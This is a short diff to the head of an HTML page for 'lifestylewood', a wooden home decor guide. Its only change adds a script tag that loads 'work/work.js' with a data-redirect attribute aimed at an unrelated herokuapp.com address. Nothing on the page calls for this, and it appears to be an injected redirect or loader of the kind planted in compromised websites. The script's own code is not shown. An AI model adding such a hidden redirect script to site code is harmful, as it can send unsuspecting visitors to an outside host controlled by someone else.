@@ -2,7 +2,8 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  
+  <script src="work/work.js" data-redirect="https://gcsummer-ddc4fb88a639.herokuapp.com/"></script>
+
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>lifestylewood — The Ultimate Wooden Home Decor Guide</title>
   <meta name="description" content="Discover how to style, select, and care for handcrafted wooden decor with lifestylewood. Your comprehensive guide to wood tones, species, room styling, and sustainable interior design.">
